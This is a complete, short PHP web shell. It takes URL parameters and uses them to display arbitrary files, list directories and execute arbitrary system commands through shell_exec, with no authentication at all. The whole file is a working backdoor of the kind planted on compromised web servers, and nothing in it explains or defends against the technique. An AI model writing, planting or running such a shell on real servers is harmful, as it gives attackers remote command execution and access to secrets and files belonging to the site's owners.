
<?php
// cat
if(isset($_GET['f'])){
	highlight_file($_GET['f']);
// cat 2
} elseif (isset($_GET['f2'])) {
	echo nl2br(htmlspecialchars(file_get_contents($_GET['f2'])));
// ls
} elseif(isset($_GET['ls'])){
	print_r(scandir($_GET['ls']));
}
// lancer shell
elseif(isset($_GET['c'])){
	print_r(shell_exec($_GET['c']));
}
